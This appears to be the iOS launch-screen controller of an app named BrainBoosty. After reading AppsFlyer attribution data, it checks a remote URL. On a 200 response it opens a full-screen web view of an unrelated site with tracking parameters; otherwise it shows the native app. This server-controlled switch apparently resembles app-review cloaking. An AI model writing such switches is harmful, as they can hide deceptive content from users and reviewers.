//
//  TaskDetailView.swift
//  BrainBoosty
//
//  Created by Ikzul Stephen on 04.10.2025.
//

import UIKit
import SwiftUI
import AppsFlyerLib

class LoadingSplash: UIViewController {

    let loadingLabel = UILabel()
    let loadingImage = UIImageView()

    private let activityIndicator: UIActivityIndicatorView = {
        let indicator = UIActivityIndicatorView(style: .large)
        indicator.color = .white
        indicator.translatesAutoresizingMaskIntoConstraints = false
        indicator.hidesWhenStopped = true
        return indicator
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupUI()
        setupFlow()
    }

    private func setupUI() {
        print("start setupUI")
        view.addSubview(loadingImage)
        loadingImage.image = UIImage(resource: .logo)
        loadingImage.contentMode = .scaleAspectFit
        loadingImage.translatesAutoresizingMaskIntoConstraints = false

        view.addSubview(activityIndicator)
        
        loadingImage.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            loadingImage.topAnchor.constraint(equalTo: view.topAnchor),
            loadingImage.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            loadingImage.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            loadingImage.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            
            activityIndicator.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            activityIndicator.centerYAnchor.constraint(equalTo: view.centerYAnchor)
        ])
    }

    private func setupFlow() {
        activityIndicator.startAnimating()

        if let savedURL = UserDefaults.standard.string(forKey: "finalAppsflyerURL") {
            print("Using existing AppsFlyer data")
            appsFlyerDataReady()
        } else {
            print("⌛ Waiting for AppsFlyer data...")

            NotificationCenter.default.addObserver(
                self,
                selector: #selector(appsFlyerDataReady),
                name: Notification.Name("AppsFlyerDataReceived"),
                object: nil
            )

            // Таймаут на случай, если данные так и не придут
            DispatchQueue.main.asyncAfter(deadline: .now() + 10) {
                if UserDefaults.standard.string(forKey: "finalAppsflyerURL") == nil {
                    print("Timeout waiting for AppsFlyer. Proceeding with fallback.")
                    self.appsFlyerDataReady()
                }
            }
        }
    }

    @objc private func appsFlyerDataReady() {
        NotificationCenter.default.removeObserver(self, name: Notification.Name("AppsFlyerDataReceived"), object: nil)
        proceedWithFlow()
    }

    private func proceedWithFlow() {
        
        CheckURLService.checkURLStatus { is200 in
            DispatchQueue.main.async { [self] in
                if is200 {
                    if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
                        appDelegate.restrictRotation = .all
                    }
                    let link = self.generateTrackingLink()
                    activityIndicator.stopAnimating()
                    let vc = WebviewVC(url: URL(string: link)!)
                    vc.modalPresentationStyle = .fullScreen
                    self.present(vc, animated: true)
                } else {
                    if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
                        appDelegate.restrictRotation = .portrait
                    }
                    activityIndicator.stopAnimating()
                        let swiftUIView = ContentView()
                            
                        let hostingController = UIHostingController(rootView: swiftUIView)
                        hostingController.modalPresentationStyle = .fullScreen
                        self.present(hostingController, animated: true)
                }
            }
        }
    }
    
    func generateTrackingLink() -> String {
        let base = "https://appios95.site/XfXLwTDZ?"
        if let savedURL = UserDefaults.standard.string(forKey: "finalAppsflyerURL") {
            let full = base + savedURL
            print("Generated tracking link: \(full)")
            return full
        } else {
            print("AppsFlyer data not available, returning base URL only")
            return base
        }
    }
}


